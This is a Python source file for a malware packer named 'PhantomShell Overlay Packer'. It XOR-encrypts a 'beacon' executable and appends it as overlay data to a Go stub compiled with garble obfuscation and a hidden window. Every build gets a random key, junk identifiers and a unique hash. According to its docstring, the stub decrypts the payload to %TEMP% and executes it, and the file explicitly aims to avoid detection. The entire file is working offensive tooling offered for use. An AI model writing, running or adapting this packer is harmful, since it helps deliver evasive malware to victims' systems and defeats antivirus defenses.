#!/usr/bin/env python3
"""
PhantomShell Overlay Packer
Compiles a minimal stub, then appends XOR-encrypted payload as overlay data.

Unlike the embedded-byte-array approach, this produces:
  - Small stub (~1.5MB vs 4MB)
  - No suspicious embedded blob in the binary
  - Encrypted payload lives in the EXE's overlay (after PE data)

Stub reads its own file at runtime, finds the payload at the end,
XOR-decrypts, writes to %TEMP%, and executes.

Usage:
    python packer_overlay.py --input beacon_v4.exe --output packed.exe
"""

import os
import sys
import struct
import uuid
import base64
import shutil
import random
import string
import hashlib
import argparse
import subprocess
import tempfile
from pathlib import Path

SCRIPT_DIR  = Path(__file__).parent.resolve()
STUB_FILE   = SCRIPT_DIR / "stub_overlay.go"
OUTPUT_DIR  = SCRIPT_DIR / "output"

GO_CANDIDATES = [
    "go",
    r"D:\Go\bin\go.exe",
    r"C:\Go\bin\go.exe",
]

GARBLE_CANDIDATES = [
    "garble",
    r"D:\Go\bin\garble.exe",
    os.path.expandvars(r"%USERPROFILE%\go\bin\garble.exe"),
]


def find_go() -> Path:
    for c in GO_CANDIDATES:
        p = Path(c)
        try:
            r = subprocess.run([str(p), "version"], capture_output=True, text=True, timeout=5)
            if r.returncode == 0:
                return p
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    print("[-] Go compiler not found!")
    sys.exit(1)


def find_garble() -> Path | None:
    for c in GARBLE_CANDIDATES:
        p = Path(c)
        try:
            r = subprocess.run([str(p), "version"], capture_output=True, text=True, timeout=5)
            if r.returncode == 0 and "garble" in (r.stdout + r.stderr).lower():
                print(f"[+] Garble: {p} — {r.stdout.strip()}")
                return p
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    print("[!] Garble not found — compiling without obfuscation")
    return None


def rand_ident(prefix: str = "x") -> str:
    return prefix + "".join(random.choices(string.ascii_letters, k=random.randint(6, 12)))


def rand_hex(n: int = 8) -> str:
    return "".join(random.choices("0123456789ABCDEF", k=n)).upper()


def pack_overlay(input_exe: Path, output_name: str):
    if not input_exe.exists():
        print(f"[-] Input not found: {input_exe}")
        sys.exit(1)

    go = find_go()
    print(f"[+] Go     : {go}")

    # ── 1. Read payload ─────────────────────────────
    payload = input_exe.read_bytes()
    payload_hash = hashlib.sha256(payload).hexdigest()[:16]
    print(f"[*] Payload: {input_exe.name} ({len(payload)/1024:.1f} KB)")
    print(f"[*] Hash   : {payload_hash}")

    # ── 2. XOR encrypt ──────────────────────────────
    xor_key = bytes(random.randint(0, 255) for _ in range(64))
    encrypted = bytes(b ^ xor_key[i % 64] for i, b in enumerate(payload))
    print(f"[*] XOR key : {xor_key[:8].hex()}...")

    # ── 3. Generate randomized stub source ────────────
    if not STUB_FILE.exists():
        print(f"[-] Stub template not found: {STUB_FILE}")
        sys.exit(1)
    template = STUB_FILE.read_text(encoding="utf-8")

    seed = uuid.uuid4().hex
    key_str = ", ".join(f"0x{b:02X}" for b in xor_key)

    replacements = {
        "{{RANDOM_HEADER}}":   f"Overlay build: {random.randint(100000,999999)}",
        "{{RANDOM_BUILD_ID}}": f"ID:{seed[:16]}",
        "{{BUILD_MARKER}}":    seed,
        "{{KEY_BYTES}}":       key_str,
        "{{JUNK_TYPE}}":       rand_ident("J"),
        "{{JUNK_VAR_1}}":      rand_ident("jv"),
        "{{JUNK_VAR_2}}":      rand_ident("jv"),
        "{{JUNK_FUNC}}":       rand_ident("jf"),
        "{{JUNK_SIZE}}":       str(random.randint(64, 256)),
        "{{JUNK_SEED}}":       str(random.randint(1000, 99999)),
        "{{JUNK_LOOP}}":       str(random.randint(5, 20)),
        "{{JUNK_HASH}}":       str(random.randint(8, 16)),
        "{{JUNK_XOR}}":        rand_hex(8),
        "{{DELAY_MIN}}":       str(random.randint(5, 30)),
        "{{DELAY_RANGE}}":     str(random.randint(10, 60)),
        "{{NAME_LEN}}":        str(random.randint(6, 12)),
    }

    source = template
    for k, v in replacements.items():
        source = source.replace(k, v)

    # ── 4. Compile stub ──────────────────────────────
    OUTPUT_DIR.mkdir(exist_ok=True)
    output_path = OUTPUT_DIR / output_name

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        go_file = tmp / "main.go"
        go_file.write_text(source, encoding="utf-8")

        subprocess.run(
            [str(go), "mod", "init", "overlay"],
            cwd=str(tmp), capture_output=True, timeout=10
        )

        env = os.environ.copy()
        env["GOOS"]        = "windows"
        env["GOARCH"]      = "amd64"
        env["CGO_ENABLED"]  = "0"
        # Ensure Go is in PATH for garble
        env["PATH"] = str(go.parent) + os.pathsep + env.get("PATH", "")

        # Try garble obfuscation (removes Go runtime fingerprint)
        garble = find_garble()
        stub_exe = tmp / "stub.exe"

        if garble:
            garble_seed = base64.b64encode(random.randbytes(8)).decode()
            build_cmd = [
                str(garble),
                "-tiny",
                "-seed", garble_seed,
                "build",
                "-ldflags", "-s -w -H windowsgui",
                "-trimpath",
                "-o", str(stub_exe),
                str(go_file),
            ]
            print(f"\n[*] Compiling stub with GARBLE (tiny, seed={garble_seed})...")
        else:
            build_cmd = [
                str(go), "build",
                "-ldflags", "-s -w -H windowsgui",
                "-trimpath",
                "-o", str(stub_exe),
                str(go_file),
            ]
            print(f"\n[*] Compiling stub (no garble)...")

        print(f"    Source: {len(source)/1024:.0f} KB (no embedded payload)")

        result = subprocess.run(
            build_cmd, cwd=str(tmp), env=env,
            capture_output=True, text=True, timeout=60
        )

        if result.returncode != 0:
            print(f"[-] Build FAILED:")
            print(result.stderr[-2000:])
            sys.exit(1)

        stub_size = stub_exe.stat().st_size
        print(f"    Stub size: {stub_size/1024:.1f} KB")

        # ── 5. Append encrypted payload + size marker ─
        # Format: [stub.exe][encrypted_payload][8-byte LE uint64 size]
        with open(stub_exe, "ab") as f:
            f.write(encrypted)
            f.write(struct.pack("<Q", len(encrypted)))

        final_size = stub_exe.stat().st_size
        shutil.copy2(stub_exe, output_path)

    # ── 6. Report ─────────────────────────────────────
    final_hash = hashlib.sha256(output_path.read_bytes()).hexdigest()[:16]

    print(f"\n{'='*60}")
    print(f"[+] PACK SUCCESS")
    print(f"    File  : {output_path}")
    print(f"    Size  : {final_size/1024:.1f} KB (stub: {stub_size/1024:.0f}KB + payload: {len(encrypted)/1024:.0f}KB)")
    print(f"    Hash  : {final_hash}")
    print(f"    Inner : {payload_hash}")
    print(f"    Method: Overlay XOR (64-byte key)")
    if garble:
        print(f"    Obfusc: garble -tiny (Go runtime fingerprint removed)")
    print(f"\n[*] No embedded blob — payload is raw overlay data at EOF")
    print(f"[*] Each build: random key, random junk, unique hash\n")


def main():
    p = argparse.ArgumentParser(description="PhantomShell Overlay Packer")
    p.add_argument("--input",  required=True,        help="Beacon EXE to pack")
    p.add_argument("--output", default="packed.exe", help="Output filename")
    args = p.parse_args()
    pack_overlay(Path(args.input), args.output)


if __name__ == "__main__":
    main()
